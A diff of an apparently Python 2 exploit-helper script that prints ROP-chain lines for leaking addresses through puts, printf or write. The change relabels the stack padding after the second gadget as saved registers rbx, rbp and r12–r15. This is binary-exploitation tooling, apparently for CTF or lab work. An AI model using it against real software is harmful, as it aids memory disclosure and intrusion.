@@ -40,13 +40,13 @@ if "puts" in binary.got:
     else:
         print "rop += p64(0x%x) # r15 [address to leak]" % to_leak
     print "rop += p64(0x%x) # gadget 2" % gadget2
-    print "rop += p64(0) # junk to reach the next gadget"
-    print "rop += p64(0) # junk"
-    print "rop += p64(0) # junk"
-    print "rop += p64(0) # junk"
-    print "rop += p64(0) # junk"
-    print "rop += p64(0) # junk"
-    print "rop += p64(0) # junk"
+    print "rop += p64(0xdeadbeef) # junk"
+    print "rop += p64(0) # rbx"
+    print "rop += p64(0) # rbp"
+    print "rop += p64(0) # r12"
+    print "rop += p64(0) # r13"
+    print "rop += p64(0) # r14"
+    print "rop += p64(0) # r15"
 elif "printf" in binary.got:
     print "[*] using `printf` to print the leak"
     print
@@ -65,13 +65,13 @@ elif "printf" in binary.got:
     else:
         print "rop += p64(0x%x) # r15 [address to leak]" % to_leak
     print "rop += p64(0x%x) # gadget 2" % gadget2
-    print "rop += p64(0) # junk to reach the next gadget"
-    print "rop += p64(0) # junk"
-    print "rop += p64(0) # junk"
-    print "rop += p64(0) # junk"
-    print "rop += p64(0) # junk"
-    print "rop += p64(0) # junk"
-    print "rop += p64(0) # junk"
+    print "rop += p64(0xdeadbeef) # junk"
+    print "rop += p64(0) # rbx"
+    print "rop += p64(0) # rbp"
+    print "rop += p64(0) # r12"
+    print "rop += p64(0) # r13"
+    print "rop += p64(0) # r14"
+    print "rop += p64(0) # r15"
 elif "write" in binary.got:
     print "[*] using `write` to print the leak"
     print
@@ -92,12 +92,12 @@ elif "write" in binary.got:
         print "rop += p64(0x%x) # r14 [address to leak]" % to_leak
     print "rop += p64(1) # r15 [stdout]"
     print "rop += p64(0x%x) # gadget 2" % gadget2
-    print "rop += p64(0) # junk to reach the next gadget"
-    print "rop += p64(0) # junk"
-    print "rop += p64(0) # junk"
-    print "rop += p64(0) # junk"
-    print "rop += p64(0) # junk"
-    print "rop += p64(0) # junk"
-    print "rop += p64(0) # junk"
+    print "rop += p64(0xdeadbeef) # junk"
+    print "rop += p64(0) # rbx"
+    print "rop += p64(0) # rbp"
+    print "rop += p64(0) # r12"
+    print "rop += p64(0) # r13"
+    print "rop += p64(0) # r14"
+    print "rop += p64(0) # r15"
 
 
